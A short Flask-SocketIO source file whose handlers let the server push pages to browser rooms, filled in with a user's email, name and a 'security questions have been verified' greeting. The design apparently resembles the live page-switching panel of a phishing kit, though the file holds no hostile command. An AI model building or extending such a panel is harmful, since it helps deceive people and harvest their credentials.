# socket_handlers.py

from flask_socketio import join_room
from state import user_rooms
from page_templates import PAGE_TEMPLATES, PAGE_6_HTML

def register_socket_handlers(socketio):

    @socketio.on("join_room")
    def handle_join(room_id):
        join_room(room_id)
        print(f"[DEBUG] Browser joined room {room_id}")
        socketio.emit("update_page", PAGE_6_HTML, room=room_id)

    def update_user_page(room_id, page_name):
        info = user_rooms.get(room_id, {})
        greeting = info.get("greeting", "Your security questions have been verified.")

        html = PAGE_6_HTML if page_name == "Page 6" else PAGE_TEMPLATES.get(
            page_name,
            "<div><h2>Unknown Page</h2></div>"
        ).format(
            email=info.get("email", ""),
            name=info.get("name", ""),
            greeting=greeting,
            room_id=room_id
        )

        socketio.emit("update_page", html, room=room_id)

    # Return for external use
    return update_user_page


